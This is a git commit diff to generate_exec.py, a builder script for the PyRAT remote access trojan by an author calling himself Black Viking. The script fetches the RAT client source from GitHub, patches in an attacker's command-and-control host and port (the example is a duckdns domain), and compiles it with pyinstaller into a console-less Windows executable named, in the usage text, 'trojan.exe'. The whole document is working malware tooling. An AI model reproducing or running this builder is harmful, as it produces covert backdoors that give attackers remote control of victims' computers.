20256b68c03b569483ba2f19ae81ce1066164b75
Black Viking <yakuza3003@yandex.com>
2017-03-18 15:38:28 +0200

    generate_exec.py

--- generate_exec.py
+++ generate_exec.py
@@ -7,61 +7,58 @@
 [~] Author : Black Viking
 """
 
-import sys, os, subprocess, urllib2, colorama
-
-def get_client(host, port, host_type):
-	if host_type == "-ip":
-		return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/client.py").read().replace("HOST = '127.0.0.1'", "HOST = '%s'"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))
-	else:
-		return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))
+import sys, os, subprocess, urllib2, colorama, shutil
 
 def usage():
 	print """
 Usage:
 ----------------------
-	python2 generate_exec.py -ip 127.0.0.1 -p 8080       #for an ip adress
-	python2 generate_exec.py -h vkng.duckdns.org -p 1604 #for a dns adress\n"""
+	python2 generate_exec.py -h 127.0.0.1 -p 8080 -n trojan.exe
+	---
+	python2 generate_exec.py -h vkng.duckdns.org -p 1604 -n trojan.exe\n"""
 	sys.exit()
+
+def get_client(host, port):
+	return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))
+
 	
-def generate_exec(host, port, source):
+def generate_exec(host, port, source, name):
 	print """
 [-] Host: %s
 [-] Port: %s\n"""%(host, port)
 	
-	file = open("template.py", "w")
+	file = open(name.split(".")[0], "w")
 	file.write(source)
 	file.close()
 
-	cmd = "pyinstaller --onefile --noconsole template.py"
+	cmd = "pyinstaller --onefile --noconsole %s"%(name.split(".")[0])
 	os.system(cmd)
-	os.remove("template.py")
+	#os.remove(name.split(".")[0]+'.py')
 	raw_input("\n\n\n[*] Press Enter to continue...")
-	if os.path.exists("%s%sdist%stemplate.exe"%(os.getcwd(), os.sep, os.sep)) == True:
-		print "\n[+] Exe file (Windows) ==> %s"%(os.getcwd()+os.sep+"dist"+os.sep+"template.exe")
+	file = "%s%sdist%s%s"%(os.getcwd(), os.sep, os.sep, name)
+	if os.path.exists(file) == True:
+		os.chdir("..")
+		shutil.copy2(file, name)
+		shutil.rmtree("exec")
+		print "\n[+] Exe file (Windows) ==> %s"%(os.getcwd()+os.sep+name)
 	else:
 		sys.exit()
 
 def main():
-	if len(sys.argv) == 5:
+	if len(sys.argv) == 7:
 		if os.path.exists("exec") == True:
 			os.chdir("exec")
 		else:
 			os.mkdir("exec")
 			os.chdir("exec")
 
-		host_type = sys.argv[1]
 		host = sys.argv[2]	
 		port = sys.argv[4]
-		if host_type == "-ip":
-			source = get_client(host, port, host_type)
+		name = sys.argv[6]
+		
+		source = get_client(host, port)
 
-		elif host_type == "-h":
-			source = get_client(host, port, host_type)
-
-		else:
-			usage()
-
-		generate_exec(host, port, source)
+		generate_exec(host, port, source, name)
 
 	else:
 		usage()
